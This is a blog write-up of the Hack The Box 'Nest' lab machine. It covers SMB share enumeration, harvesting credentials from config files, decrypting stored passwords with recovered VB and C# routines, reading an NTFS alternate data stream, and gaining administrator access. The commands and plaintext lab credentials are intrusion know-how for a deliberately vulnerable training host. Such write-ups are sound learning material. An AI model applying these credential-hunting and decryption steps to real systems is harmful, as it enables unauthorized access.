<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="icon" type="image/png" href="/favicon.png">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
  <script src="/dist/mark.min.js" charset="UTF-8"></script>
<title>Hackthebox - Nest Writeup &mdash; fmash16's blog</title>
<meta property="og:title" content="Hackthebox - Nest Writeup" />
      <meta property="og:description" content="An easy machine in HTB standards, but is quite hard." />
      <meta property="og:type" content="article" />
      <meta property="og:url" content="github" />
      <meta property="og:image" content="/img/htb_nest/card.png" />

</head>

<body>
  <!-- Side navigation -->
	<div class="sidebar">
    <div class="vertical-center">
      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
      <p style="text-align:center; color:#eee">
      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
      <p style="text-align:center;font-size:20px">
        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
      </p>
    </div>
	</div>

<article>
<h1 id="hackthebox---nest-writeup">Hackthebox - Nest Writeup</h1>
<div class="figure">
<img src="/img/htb_nest/card.png" />

</div>
<h1 id="nmap-scan">Nmap scan</h1>
<p>Open ports:</p>
<ul>
<li>445/tcp microsoft-ds?</li>
<li>4386/tcp open unknown</li>
</ul>
<h1 id="enumeration">Enumeration</h1>
<h2 id="smbclient">smbclient</h2>
<p>We use smblient to list the shares. And find a share named &quot;Data&quot; using NULL auth.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> -L <span class="dt">\\\\</span>10.10.10.178</code></pre></div>
<p><img src="/img/htb_nest/1.png" /> We connect to the share using</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data</code></pre></div>
<p>We find an interesting file under <code>\Shared\Templates\HR\</code> named &quot;Welcome Email.txt&quot;. We get the file on our local mahcine using</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smb</span>: \Shared\Templates\HR<span class="dt">\&gt;</span> get <span class="st">&quot;Welcome Email.txt&quot;</span></code></pre></div>
<p>Having a look at the file we find</p>
<div class="figure">
<img src="/img/htb_nest/2.png" />

</div>
<p>So we get some creds here. Creds found:</p>
<blockquote>
<p>Username: TempUser<br />
Password: welcome2019</p>
</blockquote>
<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
<h2 id="encrypted-password-find">Encrypted password find</h2>
<p>Logging in to the smbserver using these creds, we see that we have access to the IT folder.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data -U TempUser%welcome2019</code></pre></div>
<p>We find an intersting file RU_config.xml under <code>\IT\Configs\RU Scanner\</code>. Catting out the contents, we find some creds here</p>
<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;?xml</span> version=&quot;1.0&quot;<span class="kw">?&gt;</span> <span class="kw">&lt;ConfigFile</span><span class="ot"> xmlns:xsi=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="ot"> xmlns:xsd=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="kw">&gt;</span> <span class="kw">&lt;Port&gt;</span>389<span class="kw">&lt;/Port&gt;</span> <span class="kw">&lt;Username&gt;</span>c.smith<span class="kw">&lt;/Username&gt;</span>
  <span class="kw">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="kw">&lt;/Password&gt;</span>
<span class="kw">&lt;/ConfigFile&gt;</span></code></pre></div>
<p>The password seems to be base64 encoded. So we decode it</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= <span class="kw">|</span> <span class="ex">base64</span> -d</code></pre></div>
<p>The password includes unicode characters. So the hash is not base64. We look around the smbshare more and find something interesting in the config.xml file of notepad++</p>
<pre class="powershell"><code>&lt;History nbMaxFile=&quot;15&quot; inSubMenu=&quot;no&quot; customLength=&quot;-1&quot;&gt;
    &lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&gt;
    &lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&gt;
    &lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&gt;
&lt;/History&gt;</code></pre>
<h2 id="vb-script-encryption-debug">VB script encryption debug</h2>
<p>In &quot;VB Projects/WIP/RU/RUScanner&quot; we find some visual basic scripts. These seem to perform the encryption and decryption of the password of the user. The script Utils.vb contains the decrypt funciton. We can use this script to decrypt the encrypted pass we found using online vb.net compiler <a href="https://dotnetfiddle.net/bjoBP6">here.</a></p>
<div class="sourceCode"><pre class="sourceCode vb"><code class="sourceCode monobasic"><span class="kw">Imports</span> System
<span class="kw">Imports</span> System.Text
<span class="kw">Imports</span> System.Security.Cryptography
        
<span class="kw">Public</span> <span class="kw">Module </span>Module1

  <span class="kw">Public</span> <span class="kw">Sub </span>Main()Main
    Console.WriteLine(<span class="st">&quot;Decrypted: &quot;</span> + DecryptString(EncryptString(<span class="st">&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;</span>)))
  <span class="kw">End Sub</span>
  
    <span class="kw">Public</span> <span class="kw">Function </span>DecryptString(EncryptedString <span class="kw">As</span> <span class="dt">String</span>) <span class="kw">As</span> <span class="dt">String</span>
        <span class="kw">If </span><span class="dt">String</span>.IsNullOrEmpty(EncryptedString) <span class="kw">Then</span>
            <span class="kw">Return</span> <span class="dt">String</span>.Empty
        <span class="kw">Else</span>
            <span class="kw">Return</span> Decrypt(EncryptedString, <span class="st">&quot;N3st22&quot;</span>, <span class="st">&quot;88552299&quot;</span>, 2, <span class="st">&quot;464R5DFA5DL6LE28&quot;</span>, 256)
        <span class="kw">End If</span>
    <span class="kw">End Function</span>
  
    <span class="kw">Public</span> <span class="kw">Function </span>EncryptString(PlainString <span class="kw">As</span> <span class="dt">String</span>) <span class="kw">As</span> <span class="dt">String</span>
        <span class="kw">If </span><span class="dt">String</span>.IsNullOrEmpty(PlainString) <span class="kw">Then</span>
            <span class="kw">Return</span> <span class="dt">String</span>.Empty
        <span class="kw">Else</span>
            <span class="kw">Return</span> Encrypt(PlainString, <span class="st">&quot;N3st22&quot;</span>, <span class="st">&quot;88552299&quot;</span>, 2, <span class="st">&quot;464R5DFA5DL6LE28&quot;</span>, 256)
        <span class="kw">End If</span>
    <span class="kw">End Function</span>

    <span class="kw">Public</span> <span class="kw">Function </span>Encrypt(<span class="kw">ByVal</span> plainText <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> passPhrase <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> saltValue <span class="kw">As</span> <span class="dt">String</span>, _
                                    <span class="kw">ByVal</span> passwordIterations <span class="kw">As</span> <span class="dt">Integer</span>, _
                                   <span class="kw">ByVal</span> initVector <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> keySize <span class="kw">As</span> <span class="dt">Integer</span>) _
                           <span class="kw">As</span> <span class="dt">String</span>

        <span class="kw">Dim</span> initVectorBytes <span class="kw">As</span> <span class="dt">Byte</span>() = Encoding.ASCII.GetBytes(initVector)
        <span class="kw">Dim</span> saltValueBytes <span class="kw">As</span> <span class="dt">Byte</span>() = Encoding.ASCII.GetBytes(saltValue)
        <span class="kw">Dim</span> plainTextBytes <span class="kw">As</span> <span class="dt">Byte</span>() = Encoding.ASCII.GetBytes(plainText)
        <span class="kw">Dim</span> password <span class="kw">As</span> <span class="kw">New</span> Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        <span class="kw">Dim</span> keyBytes <span class="kw">As</span> <span class="dt">Byte</span>() = password.GetBytes(CInt(keySize / 8))
        <span class="kw">Dim</span> symmetricKey <span class="kw">As</span> <span class="kw">New</span> AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        <span class="kw">Dim</span> encryptor <span class="kw">As</span> ICryptoTransform
= symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream <span class="kw">As</span> <span class="kw">New</span> IO.MemoryStream()
            Using cryptoStream <span class="kw">As</span> <span class="kw">New</span> CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                <span class="kw">Dim</span> cipherTextBytes <span class="kw">As</span> <span class="dt">Byte</span>() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                <span class="kw">Return</span> Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    <span class="kw">End Function</span>
  
    <span class="kw">Public</span> <span class="kw">Function </span>Decrypt(<span class="kw">ByVal</span> cipherText <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> passPhrase <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> saltValue <span class="kw">As</span> <span class="dt">String</span>, _
                                    <span class="kw">ByVal</span> passwordIterations <span class="kw">As</span> <span class="dt">Integer</span>, _
                                   <span class="kw">ByVal</span> initVector <span class="kw">As</span> <span class="dt">String</span>, _
                                   <span class="kw">ByVal</span> keySize <span class="kw">As</span> <span class="dt">Integer</span>) _
                           <span class="kw">As</span> <span class="dt">String</span>

        <span class="kw">Dim</span> initVectorBytes <span class="kw">As</span> <span class="dt">Byte</span>()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        <span class="kw">Dim</span> saltValueBytes <span class="kw">As</span> <span class="dt">Byte</span>()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        <span class="kw">Dim</span> cipherTextBytes <span class="kw">As</span> <span class="dt">Byte</span>()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        <span class="kw">Dim</span> password <span class="kw">As</span> <span class="kw">New</span> Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        <span class="kw">Dim</span> keyBytes <span class="kw">As</span> <span class="dt">Byte</span>()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        <span class="kw">Dim</span> symmetricKey <span class="kw">As</span> <span class="kw">New</span> AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        <span class="kw">Dim</span> decryptor <span class="kw">As</span> ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        <span class="kw">Dim</span> memoryStream <span class="kw">As</span> IO.MemoryStream
        memoryStream = <span class="kw">New</span> IO.MemoryStream(cipherTextBytes)

        <span class="kw">Dim</span> cryptoStream <span class="kw">As</span> CryptoStream
        cryptoStream = <span class="kw">New</span> CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        <span class="kw">Dim</span> plainTextBytes <span class="kw">As</span> <span class="dt">Byte</span>()
        <span class="kw">ReDim</span> plainTextBytes(cipherTextBytes.Length)

        <span class="kw">Dim</span> decryptedByteCount <span class="kw">As</span> <span class="dt">Integer</span>
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        <span class="kw">Dim</span> plainText <span class="kw">As</span> <span class="dt">String</span>
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        <span class="kw">Return</span> plainText
    <span class="kw">End Function</span>

  
<span class="kw">End Module</span></code></pre></div>
<p>Decrypting, we find the password.</p>
<p>Creds found:</p>
<blockquote>
<p>User: c.smith<br />
Password: xRxRxPANCAK3SxRxRx</p>
</blockquote>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users -U c.smith%xRxRxPANCAK3SxRxRx</code></pre></div>
<p>Listing the files recursively, we find our required user.txt</p>
<h1 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h1>
<h2 id="hqk-reporting-service---port-4386">HQK reporting service - Port 4386</h2>
<p>From the nmap port scan, we found an open port 4386. Banner grabbing using nc, we find a service &quot;HQK Reporting Service V1.2&quot; running on the port. We get a prompt but cannot execute any commands connecting with nc. We try with telned and get success.</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">telnet</span> 10.10.10.178 4386</code></pre></div>
<h2 id="debug-mode-password---ntfs-ads">DEBUG mode password - ntfs ADS</h2>
<p>But we have limited execution. We can enter a debuyg mode using a debug mode password. We found a file named &quot;Debug Mode Password.txt&quot; in the <code>Users\C.Smith</code> share. We see that the file is empty. Looking around for quite a while, and using some help from the forum , I came to know of <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">ntfs alternate data streams</a>. So basically, data can be stored in the ntfs files in a different stream for obsfucation. We can see that the file has an alternate data stream using allinfo command. We can get the data from the alternate stream executing the following</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smb</span>: \C.Smith\HQK Reporting<span class="dt">\&gt;</span> allinfo <span class="st">&quot;Debug Mode Password.txt&quot;</span>
<span class="ex">smb</span>: \C.Smith\HQK Reporting<span class="dt">\&gt;</span> get <span class="st">&quot;Debug Mode Password.txt:Password&quot;</span></code></pre></div>
<p>Creds found: &gt; Password: WBQ201953D8w</p>
<h2 id="ldap-creds-found">LDAP creds found</h2>
<p>Now, we can use this password to enter debug mode on HQK and get more access to the files. Looking around, we see that directory ../ is HQK/ and contains a folder /LDAP. Going to the directory, we find a file ldap.conf that gives us the creds for the administrator.</p>
<pre class="txt"><code>Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</code></pre>
<p>Creds found:</p>
<blockquote>
<p>User: Administrator<br />
Password: yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</p>
</blockquote>
<h2 id="decryting-encrypted-pass-debugging-hqkldap.exednspy">Decryting encrypted pass debugging HqkLdap.exe(dnSpy)</h2>
<p>The password is encrypted. We also found a HqkLdap.exe file there. We can have a look at the file. We found this file in the Users share under &quot;C.Smith/HQK Reporting/AD Integration Module/&quot;. The file is a .NET binary.</p>
<p>In order to debug the file, we use a tool called <a href="https://github.com/0xd4d/dnSpy">dnSpy</a> We can decompile the binary into C# code. Looking at the code, we find a class <code>HqkLdap.CR</code> that has a function <code>DS</code> which decrypts the string provided. So we can use this function to decrypt our obtained hash.</p>
<div class="figure">
<img src="/img/htb_nest/dnspy.png" />

</div>
<p>We head over to the awesome <a href="https://dotnetfiddle.net/o4iGop">.netfidler</a> and edit our C# script to decrypt our hash. The script stands</p>
<div class="sourceCode"><pre class="sourceCode c#"><code class="sourceCode cs"><span class="kw">using</span> System;
<span class="kw">using</span> System.<span class="fu">IO</span>;
<span class="kw">using</span> System.<span class="fu">Security</span>.<span class="fu">Cryptography</span>;
<span class="kw">using</span> System.<span class="fu">Text</span>;
          
<span class="kw">public</span> <span class="kw">class</span> Program
{
  <span class="kw">public</span> <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Main</span>()
  {
    Console.<span class="fu">WriteLine</span>(<span class="st">&quot;Decrypting Admin Hash...&quot;</span>);
    Console.<span class="fu">WriteLine</span>(CR.<span class="fu">DS</span>(<span class="st">&quot;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&quot;</span>));
  }
}

<span class="kw">public</span> <span class="kw">class</span> CR
  {
    <span class="co">// Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678</span>
    <span class="kw">public</span> <span class="kw">static</span> <span class="dt">string</span> <span class="fu">DS</span>(<span class="dt">string</span> EncryptedString)
    {
      <span class="kw">if</span> (<span class="dt">string</span>.<span class="fu">IsNullOrEmpty</span>(EncryptedString))
      {
        <span class="kw">return</span> <span class="dt">string</span>.<span class="fu">Empty</span>;
      }
      <span class="kw">return</span> CR.<span class="fu">RD</span>(EncryptedString, <span class="st">&quot;667912&quot;</span>, <span class="st">&quot;1313Rf99&quot;</span>, <span class="dv">3</span>, <span class="st">&quot;1L1SA61493DRV53Z&quot;</span>, <span class="dv">256</span>);
    }

    <span class="co">// Token: 0x06000013 RID: 19 RVA: 0x000022B0 File Offset: 0x000006B0</span>
    <span class="kw">public</span> <span class="kw">static</span> <span class="dt">string</span> <span class="fu">ES</span>(<span class="dt">string</span> PlainString)
    {
      <span class="kw">if</span> (<span class="dt">string</span>.<span class="fu">IsNullOrEmpty</span>(PlainString))
      {
        <span class="kw">return</span> <span class="dt">string</span>.<span class="fu">Empty</span>;
      }
      <span class="kw">return</span> CR.<span class="fu">RE</span>(PlainString, <span class="st">&quot;667912&quot;</span>, <span class="st">&quot;1313Rf99&quot;</span>, <span class="dv">3</span>, <span class="st">&quot;1L1SA61493DRV53Z&quot;</span>, <span class="dv">256</span>);
    }

    <span class="co">// Token: 0x06000014 RID: 20 RVA: 0x000022E8 File Offset: 0x000006E8</span>
    <span class="kw">private</span> <span class="kw">static</span> <span class="dt">string</span> <span class="fu">RE</span>(<span class="dt">string</span> plainText, <span class="dt">string</span> passPhrase, <span class="dt">string</span> saltValue, <span class="dt">int</span> passwordIterations, <span class="dt">string</span> initVector, <span class="dt">int</span> keySize)
    {
      <span class="dt">byte</span>[] bytes = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetBytes</span>(initVector);
      <span class="dt">byte</span>[] bytes2 = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetBytes</span>(saltValue);
      <span class="dt">byte</span>[] bytes3 = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetBytes</span>(plainText);
      Rfc2898DeriveBytes rfc2898DeriveBytes = <span class="kw">new</span> <span class="fu">Rfc2898DeriveBytes</span>(passPhrase, bytes2, passwordIterations);
      <span class="dt">byte</span>[] bytes4 = rfc2898DeriveBytes.<span class="fu">GetBytes</span>(<span class="kw">checked</span>((<span class="dt">int</span>)Math.<span class="fu">Round</span>((<span class="dt">double</span>)keySize / <span class="fl">8.0</span>)));
      ICryptoTransform transform = <span class="kw">new</span> AesCryptoServiceProvider
      {
        Mode = CipherMode.<span class="fu">CBC</span>
      }.<span class="fu">CreateEncryptor</span>(bytes4, bytes);
      <span class="dt">string</span> result;
      <span class="kw">using</span> (MemoryStream memoryStream = <span class="kw">new</span> <span class="fu">MemoryStream</span>())
      {
        <span class="kw">using</span> (CryptoStream cryptoStream = <span class="kw">new</span> <span class="fu">CryptoStream</span>(memoryStream, transform, CryptoStreamMode.<span class="fu">Write</span>))
        {
          cryptoStream.<span class="fu">Write</span>(bytes3, <span class="dv">0</span>, bytes3.<span class="fu">Length</span>);
          cryptoStream.<span class="fu">FlushFinalBlock</span>();
          <span class="dt">byte</span>[] inArray = memoryStream.<span class="fu">ToArray</span>();
          memoryStream.<span class="fu">Close</span>();
          cryptoStream.<span class="fu">Close</span>();
          result = Convert.<span class="fu">ToBase64String</span>(inArray);
        }
      }
      <span class="kw">return</span> result;
    }

    <span class="co">// Token: 0x06000015 RID: 21 RVA: 0x000023DC File Offset: 0x000007DC</span>
    <span class="kw">private</span> <span class="kw">static</span> <span class="dt">string</span> <span class="fu">RD</span>(<span class="dt">string</span> cipherText, <span class="dt">string</span> passPhrase, <span class="dt">string</span> saltValue, <span class="dt">int</span> passwordIterations, <span class="dt">string</span> initVector, <span class="dt">int</span> keySize)
    {
      <span class="dt">byte</span>[] bytes = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetBytes</span>(initVector);
      <span class="dt">byte</span>[] bytes2 = Encoding.<span class="fu">ASCII</span>.<span class="fu">GetBytes</span>(saltValue);
      <span class="dt">byte</span>[] array = Convert.<span class="fu">FromBase64String</span>(cipherText);
      Rfc2898DeriveBytes rfc2898DeriveBytes = <span class="kw">new</span>
<span class="fu">Rfc2898DeriveBytes</span>(passPhrase, bytes2, passwordIterations);
      <span class="kw">checked</span>
      {
        <span class="dt">byte</span>[] bytes3 = rfc2898DeriveBytes.<span class="fu">GetBytes</span>((<span class="dt">int</span>)Math.<span class="fu">Round</span>((<span class="dt">double</span>)keySize / <span class="fl">8.0</span>));
        ICryptoTransform transform = <span class="kw">new</span> AesCryptoServiceProvider
        {
          Mode = CipherMode.<span class="fu">CBC</span>
        }.<span class="fu">CreateDecryptor</span>(bytes3, bytes);
        MemoryStream memoryStream = <span class="kw">new</span> <span class="fu">MemoryStream</span>(array);
        CryptoStream cryptoStream = <span class="kw">new</span> <span class="fu">CryptoStream</span>(memoryStream, transform, CryptoStreamMode.<span class="fu">Read</span>);
        <span class="dt">byte</span>[] array2 = <span class="kw">new</span> <span class="dt">byte</span>[array.<span class="fu">Length</span> + <span class="dv">1</span>];
        <span class="dt">int</span> count = cryptoStream.<span class="fu">Read</span>(array2, <span class="dv">0</span>, array2.<span class="fu">Length</span>);
        memoryStream.<span class="fu">Close</span>();
        cryptoStream.<span class="fu">Close</span>();
        <span class="kw">return</span> Encoding.<span class="fu">ASCII</span>.<span class="fu">GetString</span>(array2, <span class="dv">0</span>, count);
      }
    }

    <span class="co">// Token: 0x04000006 RID: 6</span>
    <span class="kw">private</span> <span class="dt">const</span> <span class="dt">string</span> K = <span class="st">&quot;667912&quot;</span>;

    <span class="co">// Token: 0x04000007 RID: 7</span>
    <span class="kw">private</span> <span class="dt">const</span> <span class="dt">string</span> I = <span class="st">&quot;1L1SA61493DRV53Z&quot;</span>;

    <span class="co">// Token: 0x04000008 RID: 8</span>
    <span class="kw">private</span> <span class="dt">const</span> <span class="dt">string</span> SA = <span class="st">&quot;1313Rf99&quot;</span>;
  }</code></pre></div>
<p>Running the script, we get our decrypted password for administrator.</p>
<div class="figure">
<img src="/img/htb_nest/3.png" />

</div>
<p>Creds found:</p>
<blockquote>
<p>User: Administrator<br />
Password: XtH4nkS4Pl4y1nGX</p>
</blockquote>
<p>Now we use the creds to get into the C$ share on smb</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users -U Administrator%XtH4nkS4Pl4y1nGX</code></pre></div>
<p>We successfully got in. Now we can read our root.txt file from <code>C:\Users\Administrator\Desktop\root.txt</code></p>
</article>

<footer>
  <p> By fmash16 </p>
</footer>
</body>
